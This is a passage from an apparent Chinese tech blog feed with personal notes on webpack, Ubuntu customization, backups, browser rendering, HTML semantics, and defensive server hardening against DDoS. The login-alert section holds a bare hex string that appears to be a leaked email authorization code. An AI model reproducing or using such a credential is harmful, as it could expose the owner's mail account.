title="webpack的四个核心概念"></a>webpack的四个核心概念</h3><p>入口(entry)、输出(output)、loader、插件(plugins)<br>入口： 单入口和多入口。<br>    传入一个数组时候，将创建”多个主入口(multi-main entry)”。在你想要多个依赖文件一起注入，并且将他们的依赖导向(graph)到一个”chunk”时候，传入数组的方式就很有用</p><p><a href="https://www.cnblogs.com/cczlovexw/p/11765571.html">webpack-merge使用</a><br><a href="https://segmentfault.com/a/1190000011831802">Node模块–rimraf</a><br><a href="https://zhuanlan.zhihu.com/p/49741879">webpack怎么配置babel</a><br><a href="https://juejin.im/post/6844904017013768205">MiniCssExtractPlugin如何使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> WebPack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu使用备忘日志</title>
      <link href="/categories/Linux/%E7%8E%A9%E6%9C%BA%E6%8C%87%E5%8D%97/ubuntu%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E6%97%A5%E5%BF%97/"/>
      <url>/categories/Linux/%E7%8E%A9%E6%9C%BA%E6%8C%87%E5%8D%97/ubuntu%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>ubuntu做了美化和升级。<br>主要参考：<a href="https://www.chainnews.com/articles/105102868075.htm">Windows 10 太难用，如何定制你的 Ubuntu？</a></p><h3 id="配置主题，图标，背景图片"><a href="#配置主题，图标，背景图片" class="headerlink" title="配置主题，图标，背景图片"></a>配置主题，图标，背景图片</h3><h4 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h4><ol><li>安装软件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-tweak-tool <span class="comment">#优化系统配置</span></span><br><span class="line">sudo apt-get install gnome-shell-extensions </span><br><span class="line">sudo apt install chrome-gnome-shell <span class="comment"># 安装chrome 扩展，可以直接在网页安装</span></span><br><span class="line">sudo apt-get autoremove --purge gnome-shell-extension-Ubuntu-dock -y <span class="comment"># 删除自带的dock ，不然会有冲突</span></span><br><span class="line">sudo apt install fonts-wqy-microhei  <span class="comment">#字体</span></span><br></pre></td></tr></table></figure><span id="more"></span></li><li>下载<a href="https://www.gnome-look.org/browse/cat/">主题、图标</a>和好看的<a href="https://wallhaven.cc/toplist">桌面背景图片</a>到<code>/usr/share/themes  ./icons ./backgrounds</code>目录下，使用tweaks的外观进行配置; 更改默认字体; 更改默认输入法<code>apt install ibus-rime</code>，并<a href="https://github.com/wongdean/rime-settings">配置</a>,更改绑定上下页快捷键为 <code>, .</code>（打开文件<code>default.custom.yaml</code>，取消注释<code>comma</code>和<code>period</code>行。</li></ol><ol start="3"><li><p>浏览器安装相应(插件)[<a href="https://extensions.gnome.org/]%EF%BC%8C%E5%BC%80%E5%90%AF%E6%89%A9%E5%B1%95[dash-to-dock](https://extensions.gnome.org/extension/307/dash-to-dock/)%E3%80%82">https://extensions.gnome.org/]，开启扩展[dash-to-dock](https://extensions.gnome.org/extension/307/dash-to-dock/)。</a></p></li><li><p><code>focalgdm3</code>配置登陆界面(<a href="https://github.com/PRATAP-KUMAR/focalgdm3">https://github.com/PRATAP-KUMAR/focalgdm3</a>)</p></li><li><p>顶部的流量监控</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-system-monitor</span><br><span class="line">sudo apt-get install indicator-sysmonitor</span><br><span class="line"><span class="comment"># 设置开机自启，添加 &#123;net&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>firefox <a href="https://github.com/vinceliuice/WhiteSur-gtk-theme/tree/master/src/other/firefox">添加主题</a></p></li><li><p>ubuntu 需要从18 Lts 升级的 20 Lts (focalgdm3 需要 20 版本)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -r</span><br><span class="line">apt --purge autoremove</span><br><span class="line">do-release-upgrade -d  <span class="comment">#升级</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载后，安装升级软件，下载速度太慢，强制重启后报错,  重启选择旧的，通过recover模式</span></span><br><span class="line">apt-get update  <span class="comment"># 都来一遍，主要是 update-grub</span></span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get autoremove -purge</span><br><span class="line">dpkg --configure -a  <span class="comment"># 更新的时候</span></span><br><span class="line">update-grub  <span class="comment"># 重点</span></span><br></pre></td></tr></table></figure></li><li><p>代理，系统升级慢主要是因为下载 flashplugin-installer 软件，用镜像也不行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install -y proxychain  <span class="comment"># 代理</span></span><br><span class="line">配置代理，通过 v2ray </span><br></pre></td></tr></table></figure><p>待：使用 iptable 进行代理转发。</p></li></ol><div style="text-align:center"><img style="text-align:center" src="https://tva1.sinaimg.cn/large/005zbIM7ly1gi2tgrh6yaj311y0lckcw.jpg"></img></div><h2 id="工具软件"><a href="#工具软件" class="headerlink" title="工具软件"></a>工具软件</h2><ul><li>下载工具 aria2, <a href="https://www.jianshu.com/p/2f7e087f452b">参考,aria2的配置使用</a></li></ul><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l  <span class="comment">#查看磁盘分区</span></span><br><span class="line"><span class="comment"># 新建目录 </span></span><br><span class="line"><span class="comment"># ntfs 是分区格式，/mnt/F是挂载目录, utf8 ， 0 代表任何用户可读写。</span></span><br><span class="line">mount -t ntfs /dev/sda2 /mnt/F -o iocharset=utf8,<span class="built_in">umask</span>=0  <span class="comment"># 可以在 /.bashrc 设置一个永久别名</span></span><br><span class="line">unmount /dev/sda2  <span class="comment"># 取消挂载</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 管理</span></span><br><span class="line">fuser -cu /dev/sda1  <span class="comment"># 查看哪个进程在使用此分区</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/fstab 文件末尾加上上面的 mount 命令，即可开机自动挂载</span></span><br></pre></td></tr></table></figure><p><a href="https://jakting.com/archives/ubuntu-rw-windows-files.html">https://jakting.com/archives/ubuntu-rw-windows-files.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/91643438">https://zhuanlan.zhihu.com/p/91643438</a></p><h2 id="系统重装"><a href="#系统重装" class="headerlink" title="系统重装"></a>系统重装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到 / 目录，打包目录 /media/Disk/myDisk</span></span><br><span class="line">` <span class="comment"># 打包 / </span></span><br><span class="line">tar -cvpzf /mnt/my_Disk/ubuntu_backup/ubuntu_backup@`date +%Y-%m-%d`.tar.gz --exclude=/proc --exclude=/tmp --exclude=/boot --exclude=/home --exclude=/lost+found --exclude=/media --exclude=/mnt --exclude=/run --exclude=/sys / &gt;/tmp/tarlog</span><br><span class="line">time tar -cvpzf /media/Disk/my_Disk/ubuntu_home_backup@`date +%Y-%m-%d`.tar.gz /home   <span class="comment"># 打包 /home,可选</span></span><br><span class="line">time tar -cvpzf /media/Disk/myDisk/ubuntu_boot_backup@`date +%Y-%m-%d`.tar.gz /boot    <span class="comment"># 打包  /boot 重要</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复时删除根目录文件，在解压到根目录下，并创建 /proc, /tmp,/lost+found,等文件夹</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_35523593/article/details/78545530">参考:Ubuntu系统备份和还原</a></p><h2 id="安全重启"><a href="#安全重启" class="headerlink" title="安全重启"></a>安全重启</h2><p>惨痛经验告诉我，系统假死一定不能强制关机。<br><a href="https://blog.csdn.net/sunny_580/article/details/78996975">参考</a></p><ol><li>可以切换到其他终端时,注销桌面重新登录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pkill Xorg</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sudo restart lightdm</span><br></pre></td></tr></table></figure></li><li>按啥都没反应，使用<code>reisub</code>大法<br>左手按住 ctrl+alt不放开，右手按 SysRq（和截屏键在一个位置），持续一秒；<br>然后保持左手不松开，右手依次按下r,e,i,s,u,b，每按一个按钮都要持续一秒钟左右，最后会重启。<br>tips:记忆窍门=&gt;热(re)爱(i)sub.<br>解释：</li></ol><ul><li>r : unRaw 将键盘控制从 X Server 那里抢回来</li><li>e : tErminate 给所有进程发送 SIGTERM 信号，让它们自己解决善后</li><li>i : kIll 给所有进程发送 SIGKILL 信号，强制他们马上关闭</li><li>s : Sync 将所有数据同步至磁盘</li><li>u : Unmount 将所有分区挂载为只读模式</li><li>b : reBoot 重启</li></ul><h2 id="零零散散"><a href="#零零散散" class="headerlink" title="零零散散"></a>零零散散</h2><p>打包统计压缩前大小</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tar</span> -tvf ubuntu_home.tar.gz |awk &#x27;&#123;sum+=$<span class="number">3</span>&#125; END &#123;print <span class="string">&quot;SUM=&quot;</span>,sum/<span class="number">1024</span>/<span class="number">1024</span>/<span class="number">1024</span>&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 玩机指南 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack使用：如何进行打包</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%89%93%E5%8C%85/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p><a href="https://juejin.im/post/6844903747051585550">主要参考,webpack2配置</a></p><p>未使用/使用 chunk插件<br>单入口 or 多入口<br>抽离第三方依赖  抽离代码公共部分</p><h4 id="多文件入口，未使用-chunk-插件"><a href="#多文件入口，未使用-chunk-插件" class="headerlink" title="多文件入口，未使用 chunk 插件"></a>多文件入口，未使用 chunk 插件</h4><p>打包结果：生成 a.js 和 b.js 两个文件，都非常大<br><img src="https://tvax3.sinaimg.cn/mw690/005zbIM7gy1ghsr5s2pd5j30e804f3yl.jpg" alt="结果1"></p><span id="more"></span><h4 id="多入口，抽离为-com-js-使用时，需先在html文件中导入-comab-js"><a href="#多入口，抽离为-com-js-使用时，需先在html文件中导入-comab-js" class="headerlink" title="多入口，抽离为 com.js (使用时，需先在html文件中导入 comab.js)"></a>多入口，抽离为 com.js (使用时，需先在html文件中导入 comab.js)</h4><p>打包结果：生成三个文件，其中公共部分和第三方依赖在 <code>comab.js</code>文件中。<br><img src="https://tvax4.sinaimg.cn/mw690/005zbIM7gy1ghssossup0j30d505ct8u.jpg" alt="结果2"></p><h4 id="单入口，未使用-chunk-插件（需要先导入-main-js-文件-不过还是报错-找不到-）"><a href="#单入口，未使用-chunk-插件（需要先导入-main-js-文件-不过还是报错-找不到-）" class="headerlink" title="单入口，未使用 chunk 插件（需要先导入 main.js 文件, 不过还是报错 找不到$）"></a>单入口，未使用 chunk 插件（需要先导入 main.js 文件, 不过还是报错 找不到$）</h4><p>打包结果：生成三个文件， main.js ，chunk.0.js ，chunk.1.js<br><img src="https://tvax4.sinaimg.cn/mw690/005zbIM7gy1ghstb70wxtj30go05nweq.jpg" alt="结果3"></p><h4 id="单入口，使用插件，children-async"><a href="#单入口，使用插件，children-async" class="headerlink" title="单入口，使用插件，children-async"></a>单入口，使用插件，children-async</h4><p><img src="https://tva3.sinaimg.cn/mw690/005zbIM7gy1ghstm1ies8j30i3065q39.jpg" alt="结果4"></p><h4 id="单入口，使用插件，第三方依赖抽离成-vendor-js"><a href="#单入口，使用插件，第三方依赖抽离成-vendor-js" class="headerlink" title="单入口，使用插件，第三方依赖抽离成 vendor.js"></a>单入口，使用插件，第三方依赖抽离成 vendor.js</h4><p>注意入口entry文件和chunk打包的输出文件要一样，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">entry: &#123;</span><br><span class="line">    <span class="attr">main</span>: <span class="string">&#x27;./app/index.js&#x27;</span>,</span><br><span class="line">    <span class="attr">vendor</span>: [<span class="string">&#x27;jquery&#x27;</span>]  <span class="comment">//vendor.js</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> webpack.optimize.CommonsChunkPlugin(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;vendor&#x27;</span>,</span><br><span class="line">            <span class="attr">filename</span>: <span class="string">&#x27;[name].js&#x27;</span>  <span class="comment">// vendor.js</span></span><br><span class="line">        &#125;);</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/mw690/005zbIM7gy1ghtm0d8zd6j30ea06cmxg.jpg" alt="结果4"></p><h4 id="单入口，使用插件，第三方依赖抽离成-vendor-js，公共代码抽离为-chunk-children-async"><a href="#单入口，使用插件，第三方依赖抽离成-vendor-js，公共代码抽离为-chunk-children-async" class="headerlink" title="单入口，使用插件，第三方依赖抽离成 vendor.js，公共代码抽离为 chunk-children-async"></a>单入口，使用插件，第三方依赖抽离成 vendor.js，公共代码抽离为 chunk-children-async</h4><p><img src="https://tva3.sinaimg.cn/mw690/005zbIM7gy1ghtmcb7e0sj30h6074dg9.jpg" alt="结果5"></p><p>webpack4 移除插件CommonsChunkPlugin，配置变得简单了。</p><h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><p>1， webpackJsonp is not defined =&gt; 导入文件的顺序需要注意<br>2， $ is not defined =&gt; 参考的教程中，index.js 文件没有导入 jquery 模块就直接输入 $，所以会报错</p><p>webpack4配置</p><p><a href="https://juejin.im/post/6859888538004783118">webpack4配置</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3，前端知识架构-浏览器是如何工作的</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/3%EF%BC%8C%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/3%EF%BC%8C%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<ol><li>请求：浏览器使用Http或Https协议，向服务器请求页面</li></ol><p>Http方法，8个<br>Http协议<br>Http状态码和状态文本<br>Http头：Request Header 和 Response Header<br>Http请求的Body  （Body的格式</p><p>Https: 作用和实现<br>Http2</p><span id="more"></span><ol start="2"><li><p>html解析，构建DOM树<br>构建DOM的过程是：从父到子，从先到后，一个一个节点构造，并且挂载到DOM树上的</p></li><li><p>计算DOM树上的css属性</p></li><li><p>渲染</p></li><li><p>位图合成？</p></li><li><p> 绘制到界面上（显示）</p></li></ol><h3 id="总结与运用"><a href="#总结与运用" class="headerlink" title="总结与运用"></a>总结与运用</h3>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 基础教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> html </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器防护</title>
      <link href="/categories/Linux/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%98%B2%E6%8A%A4/"/>
      <url>/categories/Linux/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%98%B2%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="基本的服务器防护"><a href="#基本的服务器防护" class="headerlink" title="基本的服务器防护"></a>基本的服务器防护</h2><h3 id="添加其他用户用以登录"><a href="#添加其他用户用以登录" class="headerlink" title="添加其他用户用以登录"></a>添加其他用户用以登录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd k   # 用户名</span><br><span class="line">passwd k # 密码 </span><br><span class="line"><span class="meta">#</span><span class="bash"> userdel -r k  <span class="comment"># 用户名删除</span></span></span><br></pre></td></tr></table></figure><h3 id="禁用root账号使用ssh登录"><a href="#禁用root账号使用ssh登录" class="headerlink" title="禁用root账号使用ssh登录"></a>禁用root账号使用ssh登录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config  # 编辑ssh配置文件</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查找 PermitRootLogin，把 yes 改为 no</span></span><br><span class="line">systemctl restart sshd  # 重启ssh服务</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="配置：用户登录成功后邮件通知"><a href="#配置：用户登录成功后邮件通知" class="headerlink" title="配置：用户登录成功后邮件通知"></a>配置：用户登录成功后邮件通知</h3><h4 id="需要一个邮箱账号开启第三方收发服务，最好再使用客户端授权码（而不是密码）在第三方登录"><a href="#需要一个邮箱账号开启第三方收发服务，最好再使用客户端授权码（而不是密码）在第三方登录" class="headerlink" title="需要一个邮箱账号开启第三方收发服务，最好再使用客户端授权码（而不是密码）在第三方登录"></a>需要一个邮箱账号开启第三方收发服务，最好再使用客户端授权码（而不是密码）在第三方登录</h4><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a href="https://blog.csdn.net/cbuy888/article/details/88287883">https://blog.csdn.net/cbuy888/article/details/88287883</a><br><a href="https://blog.csdn.net/cbuy888/article/details/89447835">https://blog.csdn.net/cbuy888/article/details/89447835</a><br>给文件权限，<br>改了 ipin 变量：<br>    <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo <span class="constructor">$(<span class="params">whoami</span>)</span>@<span class="constructor">$(<span class="params">w</span>|<span class="params">sed</span> -<span class="params">n</span> &#x27;3p&#x27;|<span class="params">awk</span> &#x27;&#123;<span class="params">print$3</span>&#125;&#x27;)</span>`</span><br></pre></td></tr></table></figure><br>发送内容加换行<br>32af0785653ca21c</p><h2 id="DDOS攻击的防范"><a href="#DDOS攻击的防范" class="headerlink" title="DDOS攻击的防范"></a><code>DDOS</code>攻击的防范</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>短时间内发起<strong>大量请求</strong>，耗尽服务器的资源，无法响应正常的访问，造成网站实质下线。</li><li>是一大类攻击的总称，站运行的各个环节，都可以是攻击目标。</li><li>比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承受量，导致宕机。</li></ul><h3 id="cc攻击的防范"><a href="#cc攻击的防范" class="headerlink" title="cc攻击的防范"></a>cc攻击的防范</h3><h4 id="备份临时网站"><a href="#备份临时网站" class="headerlink" title="备份临时网站"></a>备份临时网站</h4><p>备份网站或者临时主页，作为生产服务器被攻击下线后的替代网站。可以把临时主页放到 Github Pages 或者 Netlify，其支持绑定域名，还能从源码自动构建。</p><h4 id="HTTP-请求的拦截"><a href="#HTTP-请求的拦截" class="headerlink" title="HTTP 请求的拦截"></a>HTTP 请求的拦截</h4><p>拦截恶意HTTP请求，HTTP 请求的特征一般有两种：IP 地址和 User Agent 字段。所以可以：</p><ol><li>禁止恶意ip段</li><li>拦截包含 User Agent 的某个特征字段的请求</li></ol><p>实现方式：</p><ol><li>专用硬件-贵+效果好。。。</li><li>本机防火墙：如 iptables，拦截ip可以通过命令：<code>iptables -A INPUT -s 1.2.3.4 -j DROP</code>。不过其对服务器性能会有影响，也防不住大型攻击。</li><li>web 服务器过滤请求，如 nginx 和 Apache，如果需要自动识别并拦截那些频繁请求的 IP 地址），就要用到 <a href="https://en.wikipedia.org/wiki/Web_application_firewall">WAF</a>。拦截也耗服务器性能。</li><li>带宽扩容，简单说就是把请求都消化掉</li><li>CDN: CDN 指的是网站的静态内容分发到多个服务器，用户就近访问，提高速度。可以使用免费<code>cloudflare</code>来提供免费的CDN 服务 ，不过仍需注意一下两点：<ul><li>网站的大部分内容必须可以静态缓存。</li><li>不要泄露源服务器的 IP 地址，否则攻击会绕过<code>CDN</code>直接攻击源服务器</li></ul></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_33168577/article/details/79552566">Linux服务器用户登录邮件告警</a><br><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html">DDOS 攻击的防范教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 基础教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack使用</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/webpack%E4%BD%BF%E7%94%A8/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/webpack%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>webpack 可以把指定入口的一系列相互依赖的模块打包成一个文件</p><span id="more"></span><h3 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h3><p>strip-pragma-loader: 固定格式，临时使用<br>例子：<br>    <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 使用 */</span></span><br><span class="line"><span class="comment">//&gt;&gt;includeStart(&#x27;debug&#x27;, pragmas.debug);</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Debugging...&#x27;</span>);</span><br><span class="line"><span class="comment">//&gt;&gt;includeEnd(&#x27;debug&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 配置 */</span></span><br><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [&#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        enforce: pre,</span><br><span class="line">        <span class="attr">use</span>: [&#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;strip-pragma-loader&#x27;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">                <span class="attr">pragmas</span>: &#123;</span><br><span class="line">                    <span class="attr">debug</span>: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>css处理：<br>    loader处理：<br>        ‘css-loader’:<br>            解释(interpret) @import 和 url() ，会 import/require() 后再解析(resolve)它们。<br>        style-loader:<br>            集合成’style.css’文件，然后在 html文件的head标签中引用<br>    最小化：</p><pre><code>命名语法转换：    less语法转换成浏览器可以识别的css语法</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>webpack.DefinePlugin <a href="https://juejin.im/post/6844903458974203911">使用介绍</a><br>    插件用来定义全局变量，在webpack打包的时候会对这些变量做替换.<br>    JSON.stringify()</p><p>webpack.optimize.CommonsChunkPlugin <a href="https://juejin.im/post/6844903747051585550">使用介绍</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[官方：webpack:css-loader]webpackjs.com/loaders/css-loader/<br><a href="http://www.weqianduan.com/2018/09/26/style-loader-and-css-loader/">Webpack学习笔记之style-loader&amp;css-loader</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1，前端知识架构-Html</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1%EF%BC%8C%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84-html/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1%EF%BC%8C%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%9E%B6%E6%9E%84-html/</url>
      
        <content type="html"><![CDATA[<h2 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h2><ul><li><p>增加可读性，网页结构更清晰</p></li><li><p>适合机器阅读，适合搜索引擎检索</p></li><li><p>麻烦</p></li><li><p>ul和ol的区别，ul是无序列表，并列关系使用；ol是有序列表</p></li><li><p>ruby的标签，可以写拼音？</p></li><li><p> em 标签和 strong 标签的区别，em着重语气的强调，会改变所在句子的语义。</p></li><li><p>标题摘要的语义类标签-语义化结构</p><ul><li>有无 hgroup 的语义化区别（副标题的使用</li><li>section 和 h1 嵌套使用，可以制造出 h1、h2 的结构语义效果</li><li>典型的例子<span id="more"></span><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&gt;</span><br><span class="line">    <span class="selector-tag">header</span>&gt;<span class="selector-tag">nav</span>&gt;...</span><br><span class="line">    <span class="selector-tag">aside</span>&gt;<span class="selector-tag">nav</span>&gt;...</span><br><span class="line">    <span class="selector-tag">section</span>&gt;...</span><br><span class="line">    <span class="selector-tag">section</span>&gt;...</span><br><span class="line">    <span class="selector-tag">section</span>&gt;...</span><br><span class="line">    <span class="selector-tag">footer</span>&gt;<span class="selector-tag">adderss</span>&gt;...</span><br><span class="line"><span class="comment">// 结构：标题，侧边栏，正文，内容</span></span><br></pre></td></tr></table></figure></li><li>article(具有一定独立性质的文章): 例子<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-tag">body</span>&gt;</span><br><span class="line">      <span class="selector-tag">header</span>&gt;...</span><br><span class="line">      <span class="selector-tag">article</span>&gt;</span><br><span class="line">          <span class="selector-tag">header</span>&gt;...</span><br><span class="line">          <span class="selector-tag">section</span>&gt;...</span><br><span class="line">          <span class="selector-tag">section</span>&gt;...</span><br><span class="line">          <span class="selector-tag">section</span>&gt;...</span><br><span class="line">          <span 